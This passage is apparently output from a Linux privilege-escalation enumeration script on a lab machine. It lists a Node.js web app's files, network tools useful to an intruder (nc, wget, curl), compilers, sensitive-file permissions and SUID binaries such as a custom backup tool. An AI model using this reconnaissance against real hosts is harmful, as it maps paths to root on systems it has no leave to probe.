-rw-r--r--  1 root root  887 Nov 12  2016 HISTORY.md
-rw-r--r--  1 root root 2.0K Nov 12  2016 index.js
-rw-r--r--  1 root root 1.2K May 17  2016 LICENSE
-rw-r--r--  1 root root 2.3K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.7K Nov 12  2016 README.md

/var/www/myplace/node_modules/string_decoder:
total 28K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
drwxr-xr-x  2 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 2.3K Jun 22  2017 LICENSE
-rw-r--r--  1 root root   11 Jun 22  2017 .npmignore
-rw-r--r--  1 root root 1.6K Sep  2  2017 package.json
-rw-r--r--  1 root root  992 Jun 22  2017 README.md

/var/www/myplace/node_modules/string_decoder/lib:
total 20K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 8.2K Jun 22  2017 string_decoder.js

/var/www/myplace/node_modules/type-is:
total 36K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 3.9K Apr  1  2017 HISTORY.md
-rw-r--r--  1 root root 5.4K Mar 20  2017 index.js
-rw-r--r--  1 root root 1.2K Mar 20  2017 LICENSE
-rw-r--r--  1 root root 2.2K Sep  2  2017 package.json
-rw-r--r--  1 root root 4.1K Mar 25  2017 README.md

/var/www/myplace/node_modules/uid-safe:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  944 Aug  3  2017 HISTORY.md
-rw-r--r--  1 root root 1.9K Jul 26  2017 index.js
-rw-r--r--  1 root root 1.2K Jul 26  2017 LICENSE
-rw-r--r--  1 root root 2.3K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.2K Jul 26  2017 README.md

/var/www/myplace/node_modules/unpipe:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root   59 Jun 14  2015 HISTORY.md
-rw-r--r--  1 root root 1.1K Jun 14  2015 index.js
-rw-r--r--  1 root root 1.1K Jun 14  2015 LICENSE
-rw-r--r--  1 root root 1.7K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.3K Jun 14  2015 README.md

/var/www/myplace/node_modules/util-deprecate:
total 32K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.6K Oct  7  2015 browser.js
-rw-r--r--  1 root root  282 Oct  7  2015 History.md
-rw-r--r--  1 root root 1.1K Nov 25  2014 LICENSE
-rw-r--r--  1 root root  123 Nov 25  2014 node.js
-rw-r--r--  1 root root 1.5K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.7K Nov 25  2014 README.md

/var/www/myplace/node_modules/utils-merge:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  381 Jul 11  2013 index.js
-rw-r--r--  1 root root 1.1K Jul 11  2013 LICENSE
-rw-r--r--  1 root root 1.6K Sep  2  2017 package.json
-rw-r--r--  1 root root  634 Jul 11  2013 README.md
-rw-r--r--  1 root root   70 Jul 11  2013 .travis.yml

/var/www/myplace/node_modules/vary:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  707 Mar 20  2017 HISTORY.md
-rw-r--r--  1 root root 2.6K Mar 20  2017 index.js
-rw-r--r--  1 root root 1.1K Mar 20  2017 LICENSE
-rw-r--r--  1 root root 1.9K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.7K Mar 20  2017 README.md

/var/www/myplace/static:
total 24K
drwxrwxr-x 6 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  3  2017 ..
drwxrwxr-x 4 root root 4.0K Sep  2  2017 assets
drwxrwxr-x 2 root root 4.0K Sep  2  2017 partials
drwxrwxr-x 2 root root 4.0K Sep  2  2017 uploads
drwxrwxr-x 6 root root 4.0K Sep  2  2017 vendor

/var/www/myplace/static/assets:
total 16K
drwxrwxr-x 4 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
drwxrwxr-x 2 root root 4.0K Sep  2  2017 css
drwxrwxr-x 4 root root 4.0K Sep  2  2017 js

/var/www/myplace/static/assets/css:
total 36K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 4 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root  201 Sep  2  2017 app.css
-rw-rw-r-- 1 root root  11K Sep  2  2017 freelancer.css
-rw-rw-r-- 1 root root 8.5K Sep  2  2017 freelancer.min.css

/var/www/myplace/static/assets/js:
total 16K
drwxrwxr-x 4 root root 4.0K Sep  2  2017 .
drwxrwxr-x 4 root root 4.0K Sep  2  2017 ..
drwxrwxr-x 3 root root 4.0K Sep  2  2017 app
drwxrwxr-x 2 root root 4.0K Sep  2  2017 misc

/var/www/myplace/static/assets/js/app:
total 16K
drwxrwxr-x 3 root root 4.0K Sep  2  2017 .
drwxrwxr-x 4 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root  705 Sep  2  2017 app.js
drwxrwxr-x 2 root root 4.0K Sep  2  2017 controllers

/var/www/myplace/static/assets/js/app/controllers:
total 24K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 3 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root  421 Sep  3  2017 admin.js
-rw-rw-r-- 1 root root  206 Sep  2  2017 home.js
-rw-rw-r-- 1 root root  659 Sep  2  2017 login.js
-rw-rw-r-- 1 root root  484 Sep  2  2017 profile.js

/var/www/myplace/static/assets/js/misc:
total 12K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 4 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root 1.1K Sep  2  2017 freelancer.min.js

/var/www/myplace/static/partials:
total 24K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root  605 Sep  3  2017 admin.html
-rw-rw-r-- 1 root root 1.4K Sep  2  2017 home.html
-rw-rw-r-- 1 root root  709 Sep  2  2017 login.html
-rw-rw-r-- 1 root root  532 Sep  2  2017 profile.html

/var/www/myplace/static/uploads:
total 152K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root  35K Sep  2  2017 mark.jpg
-rw-rw-r-- 1 root root  62K Sep  2  2017 myP14ceAdm1nAcc0uNT.jpg
-rw-rw-r-- 1 root root  19K Sep  2  2017 rastating.jpg
-rw-rw-r-- 1 root root  23K Sep  2  2017 tom.jpg

/var/www/myplace/static/vendor:
total 24K
drwxrwxr-x 6 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
drwxrwxr-x 2 root root 4.0K Sep  2  2017 angular
drwxrwxr-x 5 root root 4.0K Sep  2  2017 bootstrap
drwxrwxr-x 6 root root 4.0K Sep  2  2017 font-awesome
drwxrwxr-x 2 root root 4.0K Sep  2  2017 jquery

/var/www/myplace/static/vendor/angular:
total 184K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root 165K Sep  2  2017 angular.min.js
-rw-rw-r-- 1 root root 5.5K Sep  2  2017 angular-route.min.js

/var/www/myplace/static/vendor/bootstrap:
total 20K
drwxrwxr-x 5 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
drwxrwxr-x 2 root root 4.0K Sep  2  2017 css
drwxrwxr-x 2 root root 4.0K Sep  2  2017 fonts
drwxrwxr-x 2 root root 4.0K Sep  2  2017 js

/var/www/myplace/static/vendor/bootstrap/css:
total 272K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 5 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root 143K Sep  2  2017 bootstrap.css
-rw-rw-r-- 1 root root 119K Sep  2  2017 bootstrap.min.css

/var/www/myplace/static/vendor/bootstrap/fonts:
total 228K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 5 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root  20K Sep  2  2017 glyphicons-halflings-regular.eot
-rw-rw-r-- 1 root root 107K Sep  2  2017 glyphicons-halflings-regular.svg
-rw-rw-r-- 1 root root  45K Sep  2  2017 glyphicons-halflings-regular.ttf
-rw-rw-r-- 1 root root  23K Sep  2  2017 glyphicons-halflings-regular.woff
-rw-rw-r-- 1 root root  18K Sep  2  2017 glyphicons-halflings-regular.woff2

/var/www/myplace/static/vendor/bootstrap/js:
total 120K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 5 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root  69K Sep  2  2017 bootstrap.js
-rw-rw-r-- 1 root root  37K Sep  2  2017 bootstrap.min.js

/var/www/myplace/static/vendor/font-awesome:
total 24K
drwxrwxr-x 6 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
drwxrwxr-x 2 root root 4.0K Sep  2  2017 css
drwxrwxr-x 2 root root 4.0K Sep  2  2017 fonts
drwxrwxr-x 2 root root 4.0K Sep  2  2017 less
drwxrwxr-x 2 root root 4.0K Sep  2  2017 scss

/var/www/myplace/static/vendor/font-awesome/css:
total 76K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root  35K Sep  2  2017 font-awesome.css
-rw-rw-r-- 1 root root  29K Sep  2  2017 font-awesome.min.css

/var/www/myplace/static/vendor/font-awesome/fonts:
total 908K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root 123K Sep  2  2017 FontAwesome.otf
-rw-rw-r-- 1 root root  75K Sep  2  2017 fontawesome-webfont.eot
-rw-rw-r-- 1 root root 383K Sep  2  2017 fontawesome-webfont.svg
-rw-rw-r-- 1 root root 150K Sep  2  2017 fontawesome-webfont.ttf
-rw-rw-r-- 1 root root  89K Sep  2  2017 fontawesome-webfont.woff
-rw-rw-r-- 1 root root  71K Sep  2  2017 fontawesome-webfont.woff2

/var/www/myplace/static/vendor/font-awesome/less:
total 128K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root  713 Sep  2  2017 animated.less
-rw-rw-r-- 1 root root  585 Sep  2  2017 bordered-pulled.less
-rw-rw-r-- 1 root root  452 Sep  2  2017 core.less
-rw-rw-r-- 1 root root  119 Sep  2  2017 fixed-width.less
-rw-rw-r-- 1 root root  495 Sep  2  2017 font-awesome.less
-rw-rw-r-- 1 root root  46K Sep  2  2017 icons.less
-rw-rw-r-- 1 root root  370 Sep  2  2017 larger.less
-rw-rw-r-- 1 root root  377 Sep  2  2017 list.less
-rw-rw-r-- 1 root root 1.6K Sep  2  2017 mixins.less
-rw-rw-r-- 1 root root  771 Sep  2  2017 path.less
-rw-rw-r-- 1 root root  622 Sep  2  2017 rotated-flipped.less
-rw-rw-r-- 1 root root  118 Sep  2  2017 screen-reader.less
-rw-rw-r-- 1 root root  476 Sep  2  2017 stacked.less
-rw-rw-r-- 1 root root  21K Sep  2  2017 variables.less

/var/www/myplace/static/vendor/font-awesome/scss:
total 128K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root  715 Sep  2  2017 _animated.scss
-rw-rw-r-- 1 root root  592 Sep  2  2017 _bordered-pulled.scss
-rw-rw-r-- 1 root root  459 Sep  2  2017 _core.scss
-rw-rw-r-- 1 root root  120 Sep  2  2017 _fixed-width.scss
-rw-rw-r-- 1 root root  430 Sep  2  2017 font-awesome.scss
-rw-rw-r-- 1 root root  46K Sep  2  2017 _icons.scss
-rw-rw-r-- 1 root root  375 Sep  2  2017 _larger.scss
-rw-rw-r-- 1 root root  378 Sep  2  2017 _list.scss
-rw-rw-r-- 1 root root 1.6K Sep  2  2017 _mixins.scss
-rw-rw-r-- 1 root root  783 Sep  2  2017 _path.scss
-rw-rw-r-- 1 root root  672 Sep  2  2017 _rotated-flipped.scss
-rw-rw-r-- 1 root root  134 Sep  2  2017 _screen-reader.scss
-rw-rw-r-- 1 root root  482 Sep  2  2017 _stacked.scss
-rw-rw-r-- 1 root root  21K Sep  2  2017 _variables.scss

/var/www/myplace/static/vendor/jquery:
total 392K
drwxrwxr-x 2 root root 4.0K Sep  2  2017 .
drwxrwxr-x 6 root root 4.0K Sep  2  2017 ..
-rw-rw-r-- 1 root root 287K Sep  2  2017 jquery.js
-rw-rw-r-- 1 root root  95K Sep  2  2017 jquery.min.js


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[-] Installed compilers:
ii  g++                                4:5.3.1-1ubuntu1                           amd64        GNU C++ compiler
ii  g++-5                              5.4.0-6ubuntu1~16.04.4                     amd64        GNU C++ compiler
ii  gcc                                4:5.3.1-1ubuntu1                           amd64        GNU C compiler
ii  gcc-5                              5.4.0-6ubuntu1~16.04.4                     amd64        GNU C compiler
ii  gcc-5-multilib                     5.4.0-6ubuntu1~16.04.4                     amd64        GNU C compiler (multilib support)
ii  gcc-multilib                       4:5.3.1-1ubuntu1                           amd64        GNU C compiler (multilib files)


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1650 Aug 31  2017 /etc/passwd
-rw-r--r-- 1 root root 818 Jan 18 14:40 /etc/group
-rw-r--r-- 1 root root 591 Sep  3  2017 /etc/profile
-rw-r----- 1 root shadow 1190 Sep  3  2017 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 81672 Jul 17  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 23376 Jan 17  2016 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
-rwsr-sr-x 1 tom admin 1037528 Jun  4 19:18 /tmp/tom
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 27608 Jun 14  2017 /bin/umount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 40152 Jun 14  2017 /bin/mount


[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign


[-] GUID files:
-rwxr-sr-x 1 root shadow 35600 Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35632 Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 62336 May 17  2017 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwxr-sr-x 1 root shadow 22768 May 17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 358624 Mar 16  2017 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mlocate 39520 Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root utmp 434216 Feb  7  2016 /usr/bin/screen
-rwxr-sr-x 1 root tty 27368 Jun 14  2017 /usr/bin/wall
-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
-rwsr-sr-x 1 tom admin 1037528 Jun  4 19:18 /tmp/tom


[+] Possibly interesting GUID files:
-rwxr-sr-x 1 root ssh 358624 Mar 16  2017 /usr/bin/ssh-agent


[-] World-writable files (excluding /proc and /sys):
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/myplace.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by-id-dm-uuid-LVM-C1KfmonhOjPQLrd2QrmScVVoSXm936T8pBEK3EVV7FMRu2x29FrJAOZ7nkr6sLsb.swap/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by-uuid-24252fd8-6fb5-4c85-99d3-40f8cfbce95b.swap/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/ifup@ens33.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by-id-dm-name-node--vg-swap_1.swap/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/scheduler.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/run-user-1001.mount/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/dev-dm-1.swap/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/dev-node-vg-swap_1.swap/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/mongodb.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mapper-node--vg-swap_1.swap/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/system.slice/system-systemd-fsck.slice/cgroup.event_control
--w--w--w- 1 root root 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control


[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
/dev/mapper/node--vg-root /               ext4    errors=remount-ro 0       1
# /boot was on /dev/sda1 during installation
UUID=ee9df611-c347-4bb7-a14b-4f23af2c0e0d /boot           ext2    defaults        0       2
/dev/mapper/node--vg-swap_1 none            swap    sw              0       0


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 3028 Aug  1  2017 /etc/adduser.conf
-rw-r--r-- 1 root root 6816 May 11  2017 /etc/overlayroot.conf
-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 100 Jan 10  2017 /etc/sos.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 350 Aug 29  2017 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 2084 Sep  6  2015 /etc/sysctl.conf
